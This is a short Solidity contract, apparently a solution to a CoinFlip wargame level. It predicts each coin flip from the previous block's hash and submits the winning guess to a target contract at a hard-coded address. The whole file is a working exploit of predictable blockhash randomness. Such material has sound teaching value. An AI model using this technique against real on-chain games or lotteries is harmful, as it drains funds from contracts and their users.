pragma solidity ^0.4.19;

contract CoinFlip {
  function flip(bool) public returns(bool);
}

contract CoinGuesser {
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlip = CoinFlip(0xefC431dE2293078Bb21E4d03CE1875995c96CF2c);

  function flip() public {
    bool guess = uint256(uint256(uint256(block.blockhash(block.number - 1))) / FACTOR) == 1 ? true : false;
    coinFlip.flip(guess);
  }
}
